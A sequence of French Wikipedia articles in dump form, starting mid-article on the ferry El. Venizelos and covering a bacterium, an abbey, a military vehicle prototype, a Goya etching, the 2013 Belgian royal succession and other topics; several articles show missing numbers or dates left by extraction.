Au cours de l'été 2014, le navire est affrété par le consortium sarde GoInSardinia et navigue entre juillet et août sur les liaisons reliant Livourne à la Sardaigne. Le 28 août, la compagnie en difficulté est contrainte de mettre fin à l'exploitation de la ligne alors que l‘"El. Venizelos" devait assurer une traversée entre Olbia et Livourne, entraînant le blocage à quai d'environ 1 500 passagers. GoInSardinia n'ayant plus les moyens de payer l'affrètement du navire, celui-ci regagne la Grèce dès le mois de septembre et navigue un temps entre Le Pirée et La Canée avant d'être désarmé à Salamine le 15 septembre.
Le 14 août 2015, il est affrété par les autorités grecques afin d'héberger les réfugiés syriens débarquant sur l'île de Kos. À partir du 19 août, il achemine des migrants vers Le Pirée depuis Mytilène.
Au mois de juin 2016, l‘"El. Venizelos" est affrété par la compagnie marocaine Africa Morocco Link (AML), fruit d'un partenariat entre la BMCE Bank et le groupe Attica. Exploité à compter du mois de juillet entre Tanger et Algésiras en Espagne, son exploitation sera interrompue le 30 septembre. Le navire s'avère en effet trop imposant au regard de la très courte durée des traversées. Durant cet affrètement, sa livrée avait été modifiée et sa coque repeinte en bleu marine, couleurs d'AML.
De retour au sein de la flotte d'ANEK Lines, l‘"El. Venizelos" est remis en service entre Le Pirée et la Crète en 2017. Entre l'hiver et le printemps 2018, d'importants travaux de rénovations sont entrepris à bord, incluant notamment la modernisation de la décoration des espaces intérieurs.
Le 29 août 2018, peu après son départ du Pirée, un incendie éclate au niveau du garage. Le navire fait alors demi-tour et rejoint Le Pirée aux alentours de 4h du matin. Les quelque 1 000 passagers sont débarqués dans le calme tandis que les pompiers s'affairent à combattre les flammes qui sont éteintes quelques heures plus tard. Le sinistre aura occasionné des dégâts au niveau du pont garage qui nécessitera l'immobilisation du navire pour réparations. Après quelques mois de travaux, il reprend ses traversées vers la Crète.
En mars 2020, le navire est affrété par une société turque qui l'emploie comme hôtel flottant à Cadix afin de loger des ouvriers. Au même moment, l'Espagne, comme le reste de l'Europe, est frappée par la pandémie de Covid-19. Alors que le navire regagne la Grèce en raison de l'interruption du contrat d'affrètement, trois cas de personnes contaminées par le virus sont identifiés à bord le 30 mars. Le navire, devant rapatrier les 383 travailleurs dans leurs pays d'origine, se voit interdire l'accès aux ports grecs et turcs. Au 2 avril, le nombre de cas passe à 119 personnes, forçant l'équipage à mouiller le navire au large du Pirée durant quatorze jours. Une fois les travailleurs débarqués, l‘"El. Venizelos" est désarmé à Perama à compter du 25 avril. Il ne reprendra du service sur ses lignes habituelles qu'à l’été 2023.
En 2025, L‘"El. Venizelos" est affrété par la compagnie publique Algérie Ferries pour la saison estivale. Retiré du service au printemps, il rejoint les chantiers d'Éleusis où les logos de la compagnie publique algérienne sont peints sur ses flancs et sa cheminée. Le navire quitte ensuite la Grèce le 15 juin pour rejoindre l'Algérie et arrive au port d'Alger quelques jours plus tard, le 18 juin. Il appareille de la capitale algérienne le 22 juin pour sa première traversée à destination de Marseille qu'il atteint le lendemain. Son retour dans la cité phocéenne est cependant marqué par son immobilisation par les autorités française dans le cadre d'une inspection qui révèlera plusieurs anomalies.
Aménagements.
L‘"El. Venizelos" possède 12 ponts. Les locaux passagers se situent sur la totalité des ponts 7 à 9 ainsi qu'une partie des ponts 5, 6, 10 et 11 tandis que ceux de l'équipage occupent une partie des ponts 7 et 10. La totalité des ponts 3 et 4 ainsi qu'une partie des ponts 5 et 6 sont pour leur part consacrés aux garages.
Locaux communs.
L‘"El. Venizelos" propose à ses passagers de nombreuses installations majoritairement situées sur le pont 9. Parmi elles se trouvent un bar-salon situé à l'avant, un restaurant à la carte au milieu ainsi qu'un self-service à l'arrière. Sur le pont 10 se trouve un bar-discothèque sur deux étages et un bar extérieur avec piscine est également situé sur le pont 11.
Cabines.
L‘"El. Venizelos" est équipé de 1 606 couchettes réparties pour la plupart dans des cabines à quatre situées principalement sur les ponts 7 et 8 mais aussi sur les ponts 5, 6 et 10. Interne et externes, toutes les cabines sont équipées de sanitaires comprenant douche, WC et lavabo. Quelques cabines à l'avant des ponts 7, 8 et 10 sont des suites.
Caractéristiques.
L‘"El. Venizelos" mesure de long pour de large, son tirant d'eau est de et sa jauge brute est de . Le navire peut embarquer et possède un garage pouvant contenir répartis sur quatre niveaux et accessible par deux portes-rampes arrières. Sa propulsion est assurée par quatre moteurs diesel Zgoda-Sulzer 16ZV 40/48 développant une capacité de entraînant deux hélices à pas variables faisant filer le bâtiment à plus de . Le car-ferry est aussi doté de deux propulseurs d’étrave et d'un stabilisateur anti-roulis à deux ailerons repliables. Il est pourvu de six embarcations de sauvetages fermées de grande taille, complétées par deux embarcations de secours, une embarcation semi-rigide ainsi que de nombreux radeaux pneumatiques.
Lignes desservies.
Depuis sa mise en service, l‘"El. Venizelos" navigue sur les différentes lignes d'ANEK Lines selon la période, principalement entre Le Pirée et la Crète vers La Canée et parfois Héraklion. Dans les années 1990, le navire naviguait essentiellement entre la Grèce et l'Italie sur la ligne Patras - Igoumenitsa - Corfou - Trieste jusqu'en 2003. Dans les années, 2000, il était parfois employé sur des croisières autour de la Méditerranée.
Le navire a également navigué sous affrètement par d'autres armateurs, en particulier la CTN qui l'a employé entre Tunis, Marseille et Gênes chaque été de 2004 à 2011. Entre mai et septembre 2013, il a été exploité par la SNCM entre Marseille, Tunis et Alger mais aussi vers la Corse entre Marseille et Porto-Vecchio au cours de l'été. Durant l'été 2014, il a effectué la liaison entre Olbia, Arbatax et Livourne pour le compte de la compagnie sarde GoInSardinia. De juillet à septembre 2016, il a navigué sous affrètement par la compagnie marocaine AML entre le Maroc et l'Espagne sur la ligne Tanger - Algésiras.
Durant l'été 2025, il est employé par Algérie Ferries entre l'Algérie et la France sur la ligne Alger - Marseille.

</doc>
<doc id="7279921" url="https://fr.wikipedia.org/wiki?curid=7279921" title="Zymomonas mobilis">
Zymomonas mobilis

Zymomonas mobilis est une bactérie anaérobie facultative à Gram négatif en forme de bâtonnet particulièrement connue pour ses capacités de fermentation alcoolique qui l'ont fait étudier pour la production industrielle d'éthanol pour biocarburants. Elle a été isolée au préalable de boissons alcooliques telles que le vin de palme africain, le pulque mexicain ainsi que comme contaminant du cidre et de la bière en Europe.
"Z. mobilis" dégrade certains glucides en pyruvate par la voie d'Entner-Doudoroff, puis le pyruvate est fermenté en éthanol et dioxyde de carbone de façon analogue aux levures. Elle est plus efficace que pour traiter le glucose, le fructose et le saccharose, mais ne traite pas les oses en tels que le xylose et l'arabinose, qui sont abondants dans les hydrolysats lignocellulosiques, et est sensible aux inhibiteurs tels que l'acide acétique et divers composés phénoliques.
La membrane plasmique de "Z. mobilis" contient des hopanoïdes, des triterpènes lipidiques qui jouent un rôle analogue à celui du cholestérol des eucaryotes, permettant à la bactérie de supporter des concentrations d'éthanol de l'ordre de 13 %.

</doc>
<doc id="7279924" url="https://fr.wikipedia.org/wiki?curid=7279924" title="Duchesse de Brabant">
Duchesse de Brabant



</doc>
<doc id="7279927" url="https://fr.wikipedia.org/wiki?curid=7279927" title="Abbaye Notre-Dame de Ham">
Abbaye Notre-Dame de Ham

L’abbaye Notre-Dame de Ham fut une abbaye de chanoines réguliers fondée au à Ham, au sud-est du département de la Somme et supprimée à la Révolution française.
Histoire.
Une abbaye de chanoines réguliers.
Il existait à Ham, depuis la période carolingienne vraisemblablement, des chanoines séculiers ("Ordo antiquus"). En 1108, participant au grand mouvement de réforme canoniale, les chanoines de Ham devinrent des chanoines réguliers ("Ordo novus"). 
Le seigneur de Ham, Odon II (1060-1089), et son épouse Louise renoncèrent à leurs droits sur l’église Notre-Dame de Ham en faveur de Baudry, évêque de Noyon, afin de créer à Ham un établissement de chanoines réguliers. Cette donation fut approuvée par le comte de Vermandois et par le roi de France Philippe. 
Le pape Pascal II érigea la communauté de chanoines en abbaye. Les chanoines réguliers suivaient la règle de saint Augustin ("regula tertia"), et en tant que prêtres exerçaient des missions paroissiales. Les chanoines de Ham s’affilièrent à l’abbaye Saint-Victor de Paris.
L’abbaye de Ham abrita les reliques de saint Waneng avant 1199.
Les chanoines revêtaient une robe blanche dans l'abbaye mais devaient revêtir une robe noire quand il sortaient de leur monastère.
En 1469, les abbés de Ham obtinrent du pape Paul II le droit de porter la mitre et les ornements pontificaux.
Adhésion à la Congrégation de France.
À partir de 1532, les abbayes françaises passèrent sous le régime de la commende. Les abbés n’étaient plus élus par les chanoines, le roi avait obtenu du pape par le oncordat de Bologne, le pouvoir de les nommer. Les abbés commendataires ne résidaient plus dans leur abbaye. Ce fut le déclin de l’abbaye de Ham.
En 1641, Les chanoines de Ham participèrent au mouvement de réforme canoniale impulsé par Charles Faure et se placèrent sous l’autorité de l’abbaye Sainte-Geneviève de Paris d’où leur nom de chanoines génovéfains et adhérèrent à la Congrégation de France.
Louis XIV logea à plusieurs reprises à l'abbaye entre 1663 à 1676 alors qu'il se rendait en Flandre. On trouvait donc à l'abbaye la "Salle du Roi", la "Salle du Dauphin", une salle de billard et un oratoire.
L’abbaye fut reconstruite au et au début du . Elle possédait une bibliothèque de plus de volumes dont plusieurs manuscrits et évangéliaires qui furent vendus, transférés au district de Péronne ou brûlés le 20 brumaire an II.
Les revenus de la mense abbatiale s’élevaient à livres. La déclaration des biens du indique que l’abbaye possédait des terres dans plus de quarante-cinq paroisses qui rapportaient livres et setiers de blé et 288 setiers d’avoine.
Disparition de l'abbaye.
La loi du supprima le clergé régulier. L’abbaye de Ham fut déclarée Bien national et l’église abbatiale Notre-Dame reconstruite en 1760 devint la seule église paroissiale de la ville. Le mobilier fut vendu le et les bâtiments furent convertis en hôpital militaire. Puis le 10 thermidor an IV, les bâtiments conventuels furent vendus à un particulier pour la somme de livres.
L'église et les bâtiments conventuels furent en grande partie détruits le lors du repli allemand sur la ligne Hindenburg. Destruction amplifiée lors de la reprise de Ham par les Alliés le . Ils furent restaurés dans l'entre-deux-guerres.
Ce qu’il reste des bâtiments abbatiaux accueille, depuis 1937, un établissement scolaire privé catholique.

</doc>
<doc id="7279928" url="https://fr.wikipedia.org/wiki?curid=7279928" title="FMC XR311">
FMC XR311

Le XR311 était un prototype de véhicule militaire d'origine américaine, auquel fut donné le surnom de . Il fut conçu et développé par la firme FMC Technologies, en partenariat avec le constructeur automobile Chrysler.
Développement.
Le développement du XR311 commença sur une initiative privée en 1969, le premier des deux prototypes étant achevé en 1970.
À la suite des essais de ces 2 prototypes, l'United States Army commanda 10 exemplaires améliorés de seconde génération, en 1971. Sur ces 10 véhicules, 4 avaient un support pour lance-missile TOW à des fins de lutte antichar, 3 possédaient une mitrailleuse cal.50 Browning M2 pour une utilisation dans des missions de reconnaissance, et les 3 restants étaient équipés d'une mitrailleuse M60 en et d'un kit de blindage pour l'équipage, afin de remplir des rôles d'escorte/protection.
Ces essais furent achevés en 1972. Ils furent ensuite testés par la blindée. En 1974, ils furent également testés en parallèle avec d'autres véhicules, au cours de la deuxième compétition des véhicules de éclaireurs de reconnaissance blindés. Il avait été établi qu'un XR311 équipé d'un lance-missile TOW coûtait aux alentours des . Il avait été conçu pour pouvoir convenir à une grande variété de rôles, de la lutte antichar à la reconnaissance, en passant par l'escorte de convois, le commandement, l'évacuation médicale, la police militaire, l'installation de mortiers ou le relais de communications pour la défense aérienne intérieure.
Caractéristiques.
Le XR311 est construit autour d'une structure tubulaire en acier, qui joue le rôle d'arceau-cage et protège les passagers si le véhicule effectue un tonneau. Cette cage est recouverte d'une feuille métallique de forte épaisseur.
Si nécessaire, un treuil électrique d'une capacité de peut être fixé à l'avant du véhicule, et le pare-brise peut être retiré.
Le compartiment passagers est au centre de la structure, avec le conducteur à gauche et deux sièges pour passagers à sa droite. Il y a de la place pour de cargo derrière eux. Le moteur et sa transmission sont à l'arrière de la structure, et un espace situé sur le capot accepte de supporter des charges pouvant atteindre une valeur maximum de . Une plaque occupant toute la longueur du véhicule est placée sous le plancher et permet au véhicule de glisser au-dessus des obstacles sans endommager ses organes internes.
La transmission est de type automatique et de marque Chrysler, une A-727 à convertisseur de couple comprenant trois vitesses AV + une marche AR. Le XR311 est un véhicule de type , utilisant des différentiels à glissement limité sur ses axes avant, arrière et central. Ils permettent de redistribuer automatiquement le couple vers les roues qui ont le plus d'adhérence lors d'un patinage excessif.
La suspension est à quatre roues indépendantes et à double triangulation, l'absorption des chocs étant réalisé par des barres de torsion et des amortisseurs hydrauliques télescopiques. Une barre stabilisatrice est fournie pour la suspension arrière et la direction est dotée d'une assistance.
Les pneus, de type "tubeless" (sans chambre à air), sont gonflés à haute pression et équipés d'un tube interne, leur permettant de se regonfler et d'éviter les pertes de pression lors des virages appuyés à haute vitesse. Ils sont aussi auto-nettoyants et chaque roue est freinée par un frein à disque.
Le système électrique est en continu et consiste en deux batteries de et un alternateur/redresseur équipé d'un régulateur intégré.
Le XR311 est muni d'un pivot de remorquage pour charges lourdes, ainsi que du câblage électrique et de la prise qui lui sont associés. Il est aéro-transportable et peut être parachuté.
Variantes.
Il existait de multiples variantes du XR311, chacune possédant un armement spécialisé :
- Un canon sans recul à six tubes de M40 recoilless rifle, monté sur le toit du compartiment équipage,
ou
- Une installation TOW (missile antichar), avec une provision de 10 missiles.
Équipé d'une mitrailleuse mitrailleuse Browning M2 en calibre .50, montée sur support circulaire pivotant sur .
Il pouvait être équipé d'une mitrailleuse sur pivot en , d'un lance-grenades automatique XM174 et d'une grande variété d'armements similaires. Ces armes pouvaient aussi être employées sur la version de reconnaissance, en les plaçant sur le support circulaire.
Le Bureau de l’Infanterie a également testé le chain gun M230 de en sur un FMC XR311.
Kits optionnels.
Les kits suivants étaient tous disponibles en option pour le véhicule de base :
Utilisateurs.
Bien qu'au sein de l'armée il ne fut jamais admis au service en tant que véhicule de combat, il y eut au moins un des douze exemplaires qui eut une carrière opérationnelle civile comme véhicule de patrouille forestière au sein du parc d'état de "Silver Lake", dans le Comté d'Oceana au Michigan.
Cet exemplaire, dont le numéro de série est le 11, est le onzième prototype à avoir été construit par la FMC. Afin de correspondre aux attentes des gardes forestiers qui en firent usage, il avait été largement modifié par les services techniques du "Michigan Department of Natural Resources", qui l'avait acheté au début des années 1980. Il avait été équipé de sirènes, feux de détresse à forte puissance, radios à deux canaux et un projecteur à forte puissance orientable. Un toit en tissu imperméable fait sur-mesure et des panneaux latéraux en vinyle transparent avaient aussi été ajoutés pour permettre d'évoluer en conditions météo difficiles.
Plus tard au-cours de sa carrière, il fut repeint en vert foncé (). À la fin de sa période de service, il fut remisé et atterrit dans un musée militaire du Wisconsin.

</doc>
<doc id="7279929" url="https://fr.wikipedia.org/wiki?curid=7279929" title="Circuit automobile de Dijon-Prenois">
Circuit automobile de Dijon-Prenois



</doc>
<doc id="7279932" url="https://fr.wikipedia.org/wiki?curid=7279932" title="Circuit de vitesse de Croix-en-Ternois">
Circuit de vitesse de Croix-en-Ternois



</doc>
<doc id="7279933" url="https://fr.wikipedia.org/wiki?curid=7279933" title="Tal para cual (Goya)">
Tal para cual (Goya)

L'eau-forte Tal para cual (en français "Qui se ressemble s'assemble") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro cinq dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Camón Aznar considère qu'il y a une obsession à faire des allusions à des personnes de la Cour. Il estime que dans ce caprice, il s'agit plus d'une satire du système social que d'individus précis.
Technique de la gravure.
Le dessin préparatoire est intitulé « Sueño 19. Las viejas se salen de risa por que saben que el no lleba un quarto ». Il est à l'encre de chine, conservé au Musée du Prado, porte l'inscription suivante au crayon : "Las viejas se salen de risa porque saben que él no lleva un cuarto" ("les vieilles éclatent de rire parce qu'elles savent qu'il n'a pas un sou"). La gravure est très fidèle au dessin. Selon Cassier, le dessin préparatoire traite de ce qui devait être le "Sueño 19". Le dessin préparatoire mesure .
Cette gravure est fortement chargée en tons noirs. Les deux couples forment deux mondes parallèles. Celui du galant et de la jeune et belle femme, trompée par le regard rapace et suffisant du gandin. Et celui des deux vieilles assises au fond qui rient et critiquent la scène.
Remarquer comment Goya transforme l'idée initiale, captée dans son esquisse préparatoire avec le commentaire "Las viejas se salen de risa porque saben que él no lleva un cuarto" en une scène plus sinistre simplement en changeant le titre en "Tal para cual" et en ajoutant quelques touches obscures.
L'estampe mesure sur une feuille de papier de . Goya a utilisé l'eau-forte, l'aquatinte et la pointe sèche.

</doc>
<doc id="7279934" url="https://fr.wikipedia.org/wiki?curid=7279934" title="Malala">
Malala

Malala peut désigner :

</doc>
<doc id="7279939" url="https://fr.wikipedia.org/wiki?curid=7279939" title="Fujiwara no Ishi">
Fujiwara no Ishi

 est une impératrice consort du Japon. Consort de l'empereur Go-Ichijō (1008-1036), elle est la troisième fille de Fujiwara no Michinaga.
Descendance :

</doc>
<doc id="7279942" url="https://fr.wikipedia.org/wiki?curid=7279942" title="Trần Thị Hương Giang">
Trần Thị Hương Giang

Trần Thị Hương Giang, née le à Haiyang, est une mannequin vietnamienne.
Biographie.
En 2005, Trần Thị Hương Giang a fait ses études à l'université nationale de Hanoï. En 2007, elle a déménagé à Hô-Chi-Minh-Ville pour entrer à l'université national de Hô-Chi-Minh-Ville en journalisme.
Élection Miss Hai Duong 2006.
Le , au palais des sports dans la province de Hai Duong, elle est couronnée Miss Hai Duong 2006.
Ses dauphines :
Autres concours de beauté.
En 2005, elle participe au concours Photogenic Vietnam et se classe dans le top 10.
Le , à Nha Trang, elle a été élue , au concours Miss Vietnam 2006 face à la candidate, Mai Phương Thúy. Elle a gagné le prix de la « meilleure coiffure »
Le , elle est élue Miss Grand Slam Asia 2009. Elle est la première vietnamienne à avoir remporté le concours.
Le , elle représente le Viêt Nam au concours de Miss Monde à Johannesburg, en Afrique du Sud et se classe au top 16. Le , elle a atteint le top 12 au concours de Miss World Beach Beauty. Le , elle est élue au concours de Miss World Top Model.
Le , à Hong Kong et en Chine, elle participe à Miss Asie mais ne gagne pas de prix.
Vie privée.
Le , sur l'île de Phú Quốc, elle s'est mariée avec Liu Jia, originaire de Hubei (Chine) et employé d'une compagnie aérienne chinoise, après 2 ans de relation. Le , elle donne naissance à son premier enfant.

</doc>
<doc id="7279945" url="https://fr.wikipedia.org/wiki?curid=7279945" title="Jean-Baptiste Coclers">
Jean-Baptiste Coclers

Jean-Baptiste Coclers, né à Maastricht le et mort à Liège le , est un artiste peintre néerlandais de portraits, de natures mortes et de sujets historiques.
Biographie.
Jean-Baptiste Pierre Coclers, né à Maastricht en 1696, est le fils et élève du peintre liégeois Philippe Coclers qui vivait alors à Maastricht. Philippe Coclers revint à Liège avec son fils en 1702.
De 1713 jusqu'à 1729, Jean-Baptiste étudia à Rome avec Sebastiano Conca et Marco Benefial et travailla avec le peintre paysagiste Giovanni Niccolò Servandoni.
Après ses années italiennes, il travailla quelque temps de 1729 à 1731 à Marseille où il a peint une grande fresque de la bourse (détruit). De 1731 jusqu'à 1738, il a travailla à Maastricht, après quoi il s'établit à Liège, où il fut nommé peintre de la Cour des princes-évêques Georges-Louis de Berghes, Jean-Théodore de Bavière et Charles-Nicolas d'Oultremont.
Jean-Baptiste meurt en 1772 en homme riche et peintre de grande réputation. Cependant, après sa mort, sa réputation déclina rapidement.
Son fils Louis-Bernard Coclers fut également un peintre de renom. Son second fils, Philippe Henri Coclers van Wyck, fut directeur de l'académie d'art de Marseille, ville où il fut peintre. Sa fille, Marie-Lambertine Coclers, fut connue ses gravures dans le style d'Adriaen van Ostade.

</doc>
<doc id="7279949" url="https://fr.wikipedia.org/wiki?curid=7279949" title="Passation de pouvoir entre Albert II et Philippe">
Passation de pouvoir entre Albert II et Philippe

Le , jour de fête nationale en Belgique, est un jour particulier dans l'histoire du pays, qui vit l'abdication du roi et l'accession au trône de son fils Philippe, lequel devient le roi des Belges. Compte tenu de ces circonstances particulières, les cérémonies de cette journée ont fait l'objet d'une large couverture médiatique nationale et internationale.
Déroulement de la passation de pouvoir.
La famille royale belge assiste, à 9 heures, au traditionnel "Te Deum" du , à la cathédrale Saints-Michel-et-Gudule de Bruxelles, célébration qui est l'occasion de saluer l'œuvre du roi abdicataire.
Abdication du roi.
Le roi se présente en la salle du trône du Palais royal de Bruxelles, à , pour signer l'acte de son abdication en présence des autorités politiques et représentants des corps constitués agissant en qualité de témoins. &lt;br&gt;
Sont présents notamment, le gouvernement fédéral au complet, la famille royale (à savoir le futur roi Philippe et son épouse Mathilde, la reine Paola, la reine Fabiola, le prince Laurent et son épouse, la princesse Astrid et son époux) les ministres-présidents des entités fédérées (Rudy Vervoort ministre-président de la Région bruxelloise, Karl-Heinz Lambertz ministre-président de la Communauté germanophone, Rudy Demotte ministre-président de la Région wallonne et de la Communauté française, Kris Peeters, ministre-président de la Communauté flamande), les présidents des différents parlements nationaux et régionaux (dont Jan Peumans, président du parlement flamand et membre du parti républicain et indépendantiste N-VA), les présidents de la plupart des partis politiques démocratiques, les anciens Premiers ministres, les autorités judiciaires et militaires du pays. &lt;br&gt;
Le roi prononce d'abord un discours devant l'assemblée, dans lequel il remercie les acteurs de la réforme de l'État qui est alors en cours. Il fait part de son attachement à l'unité du pays en conseillant aux décideurs de la maintenir à tout prix. Il ose également un écart non prévu dans le discours en remerciant la Reine Paola, la gratifiant d'un « gros kiss ». &lt;br&gt;
Vient ensuite le discours du Premier ministre, Elio Di Rupo, qui remercie le roi pour son règne, et la lecture de l'acte d'abdication par Annemie Turtelboom, ministre de la Justice. Cet acte est signé par 11 témoins symbolisant les trois pouvoirs, dont le premier ministre et les six vice-Premiers ministres (pouvoir exécutif), le président de la Chambre André Flahaut, la présidente du Sénat Sabine de Bethune (pouvoir législatif) et les présidents des plus hautes chambres de justice du pays (pouvoir judiciaire), pour être ensuite signé de la main d' lui-même. &lt;br&gt;
Dès ce moment, commence l'inter-règne qui, selon la Constitution belge, ne peut durer qu'un maximum de dix jours. Selon le droit constitutionnel belge, la succession d'un roi décédé ou abdiquaire ne commence en effet qu'au moment de la prestation de serment du nouveau roi devant le Parlement réuni, dans l'hémicycle de la Chambre des représentants de Belgique, qui a droit de préséance sur le Sénat.
Prestation de serment du roi Philippe.
La cérémonie, qui se tient au palais de la Nation où siègent les représentants de la Nation, débute par la déclaration bilingue de Sabine de Bethune, présidente néerlandophone du Sénat belge et d'André Flahaut, président francophone de la Chambre des représentants de Belgique, constatant l'abdication du roi .
Le prince Philippe est alors introduit dans l'hémicycle du Parlement, réaménagé pour la circonstance, pour prononcer, dans les trois langues nationales, le français, le néerlandais et l'allemand, la prestation de serment, faisant de lui le nouveau roi des Belges.
Le nouveau roi prononce ensuite le discours du trône. Bien que présente, la délégation du parti indépendantiste flamand Nieuw-Vlaamse Alliantie s'est abstenue de toute démonstration. Le député indépendant flamand Jean-Marie Dedecker n'a pas applaudi le discours, tandis que le parti d'extrême-droite flamand Vlaams Belang était absent. José Manuel Durão Barroso, président de la Commission européenne, a été convié à la cérémonie et l'hymne européen a été exécuté à la suite de "La Brabançonne", l'hymne national, pour symboliser l'attachement de la Belgique à l'Union européenne.
Le couple royal s'est ensuite rendu, encadré par l'escorte royale à cheval, au Palais royal pour saluer la foule rassemblée. Comme il est de tradition, une salve de 101 coups de canon a été tirée depuis le Parc du Cinquantenaire.
Salut au soldat inconnu à la colonne du Congrès.
Comme il est de tradition lors de l'accession au trône d'un nouveau roi en Belgique, Philippe s'est rendu à à la Colonne du Congrès pour rendre hommage au soldat inconnu – cérémonie qui ne fait ordinairement pas partie du programme des manifestations de la Fête nationale – en présence des autorités politiques et militaires. Pour la première fois, le roi porte à cette occasion la tenue de général quatre étoiles, grade du roi en qualité de chef nominal des armées et plus haut grade de l'armée belge.
Défilé militaire.
En fin d'après-midi, le roi Philippe a assisté à la traditionnelle revue du , première manifestation officielle à laquelle a pris part le nouveau souverain. Celle-ci est l'occasion de célébrer le soixantième anniversaire de la fin de la Guerre de Corée à laquelle avait participé un contingent belge. Le défilé est également marqué par une importante présence des forces armées européennes, du contingent belge de la Force internationale d'assistance et de sécurité (ISAF) ou encore du contingent attaché à la Force intérimaire des Nations unies au Liban (FINUL).

</doc>
<doc id="7279953" url="https://fr.wikipedia.org/wiki?curid=7279953" title="François-Antoine de La Boissière">
François-Antoine de La Boissière

François-Antoine de La Boissière, est né à Perpignan en Roussillon le , fils de Jean-Baptiste de Laboissière, commissaire des guerres à Perpignan, et de Rose de Barescut. Il est mort à Perpignan (Pyrénées-Orientales) le . Il est un ecclésiastique et homme politique français.
Il est chanoine du chapitre de la cathédrale Saint-Jean-Baptiste de Perpignan et vicaire général du diocèse d'Elne.
En 1766, il prononce l'oraison funèbre du duc de Noailles, qui est imprimée à Perpignan.
Le , il est élu député du clergé aux États généraux de 1789 par la viguerie de Perpignan. Membre de l'Assemblée nationale constituante, il siège à droite et refuse de prêter le serment à la constitution civile du clergé.
Il émigre en 1792 en Espagne, et se fixe à Barcelone.
En 1802, il rentre en France. En 1803, il est nommé provicaire général pour le département des Pyrénées-Orientales et curé de la cathédrale Saint-Jean par Arnaud Ferdinand de la Porte, évêque de Carcassonne. Il meurt à Perpignan le 9 août 1809.

</doc>
<doc id="7279954" url="https://fr.wikipedia.org/wiki?curid=7279954" title="Eichendorff-Lieder">
Eichendorff-Lieder

Les Eichendorff-Lieder ("Gedichte von Eichendorff") sont un recueil de lieds de Hugo Wolf, publié en 1889. Les lieds avaient été composés pour la plupart en 1888, quelques-uns antérieurement. Les commentateurs sont unanimes à considérer deux lieds de ce recueil comme des chefs-d'œuvre :

</doc>
<doc id="7279958" url="https://fr.wikipedia.org/wiki?curid=7279958" title="Daktulosphaira vitifoliae">
Daktulosphaira vitifoliae



</doc>
<doc id="7279959" url="https://fr.wikipedia.org/wiki?curid=7279959" title="Région déterminant la complémentarité">
Région déterminant la complémentarité

Dans le domaine de la biologie cellulaire, les régions déterminant la complémentarité (CDR) correspondent à des régions spécifiques d'anticorps (appartenant aux chaînes légères des immunoglobulines) sans domaine immunoglobulinique. Ils déterminent l'avidité de l'immunoglobuline, et la spécificité pour quelques antigènes.
Ces CDR sont les parties les plus variables des anticorps et contribuent donc à leur diversité, et à la reconnaissance d'un très vaste répertoire d'antigènes.
Une théorie attribue l'apparition des CDR pour la première fois chez les gnathostomes.

</doc>
<doc id="7279961" url="https://fr.wikipedia.org/wiki?curid=7279961" title="Stade Rudolf-Tonn">
Stade Rudolf-Tonn

Le stade Rudolf-Tonn est un stade de football et d'athlétisme situé à Rannersdorf dans la commune de Schwechat en Autriche, inauguré le . Sa capacité est de places.

</doc>
<doc id="7279963" url="https://fr.wikipedia.org/wiki?curid=7279963" title="Agence nationale pour la promotion et la rationalisation de l'utilisation de l'énergie">
Agence nationale pour la promotion et la rationalisation de l'utilisation de l'énergie

L'Agence nationale pour la promotion et la rationalisation de l’utilisation de l’énergie (ou APRUE) est un établissement public à caractère industriel et commercial algérien, créé par décret présidentiel en 1985 et placé sous la tutelle du ministère de l’Énergie et des Mines.
Mission.
L'APRUE a pour mission principale la mise en œuvre de la politique nationale de maîtrise de l’énergie et ce à travers la promotion de l’efficacité énergétique.
Dans le cadre de la loi n° 99- 09 du relative à la maîtrise de l’Énergie, l’agence a pour mission :
Partenaires.
L'APRUE est notamment associée avec le "".
FNME.
Le FNME est le Fonds national pour la maîtrise de l’énergie.
Rôle et utilisation du FNME
Le FNME est l’instrument public algérien spécifique d’incitation de la politique de maîtrise de l’énergie. Il a pour objet de contribuer à l’impulsion et au développement, à terme, d’un marché de la maîtrise de l’énergie
Six domaines sont éligibles au financement par le FNME :

</doc>
<doc id="7279964" url="https://fr.wikipedia.org/wiki?curid=7279964" title="Gidayū-bushi">
Gidayū-bushi

Le est un style narratif du théâtre de marionnettes "bunraku", créé par Takemoto Gidayū (1651-1714, 竹本義太夫), qui fusionne la déclamation vigoureuse du "katarimono" (語り物) et l'élément mélodique du "utaimono" (歌い物 ou 歌物).
Ce style devient le modèle de référence pour la récitation après que son collaborateur, le dramaturge Chikamatsu Monzaemon, travaille au théâtre (竹本座), à l'est du quartier Dōtombori à Osaka en 1684.

</doc>
<doc id="7279970" url="https://fr.wikipedia.org/wiki?curid=7279970" title="Teigne des crucifères">
Teigne des crucifères



</doc>
<doc id="7279972" url="https://fr.wikipedia.org/wiki?curid=7279972" title="Teigne des choux">
Teigne des choux



</doc>
<doc id="7279977" url="https://fr.wikipedia.org/wiki?curid=7279977" title="Comité d'action révolutionnaire nord-africain">
Comité d'action révolutionnaire nord-africain

Le Comité d'action révolutionnaire nord-africain ou CARNA a été fondé en 1938 par un groupe de militants du Parti du peuple algérien (PPA) écartés du parti par son président, Messali Hadj, en raison de leur rapprochement avec l'Allemagne nazie.
Le contexte historique.
Le , arrestation de Messali et de quatre de ses principaux collègues du comité directeur du PPA qui tous, écoperont de deux années de prison.
Le Kahal et Filali qui, depuis septembre, étaient chargés de la direction intérimaire du parti sont également arrêtés.
La direction du PPA était, dès lors, réduite à quelques rescapés comme Mezerna, Belaïd, Bouda ou Khider et un nouveau comité central fut désigné en .
À une année du déclenchement du second conflit mondial, l'Allemagne hitlérienne affichait ses visées hégémoniques sur l'ensemble de l'Europe. Pressentant l'écrasement prochain de la France sous le rouleau compresseur du troisième Reich, les responsables encore en liberté du Parti du Peuple Algérien s'interrogeaient sur l'attitude à adopter dans une telle éventualité.
La fondation du CARNA.
